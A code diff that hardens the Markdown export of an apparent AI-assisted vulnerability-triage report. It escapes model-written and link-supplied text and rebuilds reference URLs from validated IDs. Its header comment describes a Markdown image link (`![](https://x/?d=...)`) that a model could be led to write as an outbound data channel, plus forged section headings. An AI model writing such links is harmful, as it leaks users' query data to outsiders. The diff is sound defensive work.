@@ -5,9 +5,11 @@
  *
  * The output mirrors the on-screen layout: header + summary +
  * recommended action + per-CVE details + ATT&CK techniques +
- * reasoning chain. Free-text fields are passed through verbatim
- * (they were already fenced at the tool boundary on the backend
- * before reaching the model).
+ * reasoning chain. Free text is model-written, and on /r it comes from
+ * whoever built the link, so nothing is interpolated raw: a model-written
+ * `![](https://x/?d=...)` auto-fetches in Markdown previews, an outbound
+ * channel for whatever the model saw in the query, and a line starting
+ * "## SSVC verdict" would forge a section of this document.
  */
 
 import type {
@@ -19,15 +21,66 @@ import type {
   FeedStatus,
 } from "./types";
 
-const UNTRUSTED_START = "<UNTRUSTED_CONTENT>";
-const UNTRUSTED_END = "</UNTRUSTED_CONTENT>";
+// The markers carry a per-process id (mcp_server/security.py); the bare form is
+// what reports captured before the id still hold.
+const FENCED =
+  /^<UNTRUSTED_CONTENT(?: id="[^"]*")?>([\s\S]*)<\/UNTRUSTED_CONTENT(?: id="[^"]*")?>$/;
 
-function stripFence(text: string): string {
-  const t = text.trim();
-  if (t.startsWith(UNTRUSTED_START) && t.endsWith(UNTRUSTED_END)) {
-    return t.slice(UNTRUSTED_START.length, -UNTRUSTED_END.length).trim();
-  }
-  return text;
+// Strip the marker tokens while keeping whether the text was fenced. The fence
+// is a wire-level convention; the view renders it as a styled quote.
+export function unfence(text: string): { body: string; fenced: boolean } {
+  const match = text.trim().match(FENCED);
+  return match ? { body: match[1].trim(), fenced: true } : { body: text, fenced: false };
+}
+
+// CommonMark ends a line on CR as well as LF.
+function splitLines(value: string): string[] {
+  return value.split(/\r\n?|\n/).map((line) => line.trim());
+}
+
+// A bare URL goes in a code span: GFM links it otherwise, and a backslash cannot
+// stop that, it only corrupts the link. Everything else that opens an inline
+// construct gets escaped, in one pass so an escape is never escaped again.
+const INLINE_HAZARD = /((?:https?:\/\/|www\.)[^\s`|<>]+)|[\\`*_[\]<>!|~&]/gi;
+
+// One logical line, safe wherever inline Markdown goes.
+function mdInline(value: string): string {
+  return splitLines(value)
+    .filter(Boolean)
+    .join(" ")
+    .replace(INLINE_HAZARD, (hazard, url) => (url ? `\`${url}\`` : `\\${hazard}`));
+}
+
+// What opens a block at the start of a line: headings, lists, setext underlines,
+// thematic breaks, table delimiter rows. ">" is already escaped inline.
+function defuseBlockStart(line: string): string {
+  return (
+    line
+      .replace(/^[#+\-=:]/, "\\$&")
+      // A backslash only escapes punctuation: the delimiter, not the digit.
+      .replace(/^(\d+)([.)])/, "$1\\$2")
+  );
+}
+
+// As mdInline, keeping the line breaks as hard breaks.
+function mdBlock(value: string): string {
+  return splitLines(unfence(value).body)
+    .map((line) => defuseBlockStart(mdInline(line)))
+    .join("  \n");
+}
+
+// Derived from the validated ids, like agent/references.py: on /r no server has
+// canonicalized anything, and the id is the only part of a reference worth trusting.
+function nvdUrl(cveId: string): string {
+  return `https://nvd.nist.gov/vuln/detail/${cveId}`;
+}
+
+function techniqueUrl(id: string): string {
+  return `https://attack.mitre.org/techniques/${id.replace(".", "/")}/`;
+}
+
+function mitigationUrl(id: string): string {
+  return `https://attack.mitre.org/mitigations/${id}/`;
 }
 
 function formatYesNo(value: boolean | null | undefined): string {
@@ -51,7 +104,7 @@ function renderCve(cve: CVEReference): string {
   }
   lines.push(`- **Public exploit**: ${formatYesNo(cve.exploits_public)}`);
   if (cve.in_kev_catalog) {
-    const due = cve.kev_due_date ? ` (CISA due ${cve.kev_due_date})` : "";
+    const due = cve.kev_due_date ? ` (CISA due ${mdInline(cve.kev_due_date)})` : "";
     lines.push(`- **CISA KEV**: yes${due}`);
   } else {
     lines.push(`- **CISA KEV**: no`);
@@ -64,28 +117,28 @@ function renderCve(cve: CVEReference): string {
     lines.push(`- **EPSS**: ${formatPercent(cve.epss_probability)}${pct}`);
   }
   if (cve.affected_products.length > 0) {
-    lines.push(`- **Affected**: ${cve.affected_products.join(", ")}`);
+    lines.push(`- **Affected**: ${cve.affected_products.map(mdInline).join(", ")}`);
   }
-  lines.push(`- **NVD**: ${cve.nvd_url}`);
+  lines.push(`- **NVD**: ${nvdUrl(cve.cve_id)}`);
   lines.push("");
-  lines.push("> " + stripFence(cve.summary).replace(/\n/g, "\n> "));
+  lines.push("> " + mdBlock(cve.summary).replace(/\n/g, "\n> "));
   lines.push("");
   return lines.join("\n");
 }
 
 function renderTechnique(t: AttackTechnique): string {
   const lines: string[] = [];
-  const tactics = t.tactics.length > 0 ? ` _(tactics: ${t.tactics.join(", ")})_` : "";
-  lines.push(`### ${t.id} - ${t.name}${tactics}`);
+  const tactics = t.tactics.length > 0 ? ` _(tactics: ${t.tactics.map(mdInline).join(", ")})_` : "";
+  lines.push(`### ${t.id} - ${mdInline(t.name)}${tactics}`);
   lines.push("");
-  lines.push(`- **Reference**: ${t.url}`);
+  lines.push(`- **Reference**: ${techniqueUrl(t.id)}`);
   if (t.related_cwes.length > 0) {
-    lines.push(`- **Triggered by**: ${t.related_cwes.join(", ")}`);
+    lines.push(`- **Triggered by**: ${t.related_cwes.map(mdInline).join(", ")}`);
   }
   if (t.mitigations.length > 0) {
     lines.push(`- **Mitigations**:`);
     for (const m of t.mitigations) {
-      lines.push(`  - ${m.id} - ${m.name} (${m.url})`);
+      lines.push(`  - ${m.id} - ${mdInline(m.name)} (${mitigationUrl(m.id)})`);
     }
   }
   lines.push("");
@@ -102,18 +155,19 @@ function renderSsvc(ssvc: SsvcAssessment, shared: boolean): string {
       : "_Deterministic prioritization, computed server-side from the collected signals (not the LLM)._",
   );
   lines.push("");
-  lines.push(`- **Decision**: ${ssvc.decision}`);
-  lines.push(`- **Rule**: \`${ssvc.rule}\``);
+  lines.push(`- **Decision**: ${mdInline(ssvc.decision)}`);
+  lines.push(`- **Rule**: ${mdInline(ssvc.rule)}`);
   if (ssvc.driving_cve) {
     lines.push(`- **Driving CVE**: ${ssvc.driving_cve}`);
   }
   if (ssvc.basis && ssvc.basis !== "evidence") {
     const unverified = ssvc.unverified_signals ?? [];
-    const suffix = unverified.length > 0 ? ` (unverified: ${unverified.join(", ")})` : "";
+    const suffix =
+      unverified.length > 0 ? ` (unverified: ${unverified.map(mdInline).join(", ")})` : "";
     lines.push(`- **Basis**: ${ssvc.basis}${suffix}`);
   }
   lines.push("");
-  lines.push(ssvc.rationale);
+  lines.push(mdBlock(ssvc.rationale));
   lines.push("");
   return lines.join("\n");
 }
@@ -125,7 +179,7 @@ function renderCoverage(coverage: FeedStatus[]): string {
   lines.push("| Feed | Status | Detail |");
   lines.push("|---|---|---|");
   for (const f of coverage) {
-    lines.push(`| ${f.feed} | ${f.status} | ${f.detail ?? ""} |`);
+    lines.push(`| ${mdInline(f.feed)} | ${f.status} | ${mdInline(f.detail ?? "")} |`);
   }
   lines.push("");
   return lines.join("\n");
@@ -154,7 +208,9 @@ function renderGrounding(g: GroundingAssessment, shared: boolean): string {
     lines.push("| Subject | Field | Status | Detail |");
     lines.push("|---|---|---|---|");
     for (const f of g.findings) {
-      lines.push(`| ${f.subject} | \`${f.field}\` | ${f.status} | ${f.detail ?? ""} |`);
+      lines.push(
+        `| ${mdInline(f.subject)} | ${mdInline(f.field)} | ${f.status} | ${mdInline(f.detail ?? "")} |`,
+      );
     }
     lines.push("");
   }
@@ -214,7 +270,7 @@ export function reportToMarkdown(
   lines.push(`- **${shared ? "Exported" : "Generated"}**: ${now}`);
   if (query) {
     const oneLineQuery = query.length > 200 ? query.slice(0, 200) + "..." : query;
-    lines.push(`- **Query**: \`${oneLineQuery.replace(/`/g, "\\`")}\``);
+    lines.push(`- **Query**: ${mdInline(oneLineQuery)}`);
   }
   lines.push("");
 
@@ -224,12 +280,12 @@ export function reportToMarkdown(
 
   lines.push("## Summary");
   lines.push("");
-  lines.push(stripFence(report.summary));
+  lines.push(mdBlock(report.summary));
   lines.push("");
 
   lines.push("## Recommended action");
   lines.push("");
-  lines.push(stripFence(report.recommended_action));
+  lines.push(mdBlock(report.recommended_action));
   lines.push("");
 
   if (report.signal_coverage?.length > 0) {
@@ -262,7 +318,8 @@ export function reportToMarkdown(
     lines.push(`## Reasoning chain (${report.reasoning_chain.length} steps)`);
     lines.push("");
     report.reasoning_chain.forEach((step, i) => {
-      lines.push(`${i + 1}. ${step}`);
+      // List-item content is block-parsed: a prefix does not make it inline.
+      lines.push(`${i + 1}. ${defuseBlockStart(mdInline(step))}`);
     });
     lines.push("");
   }
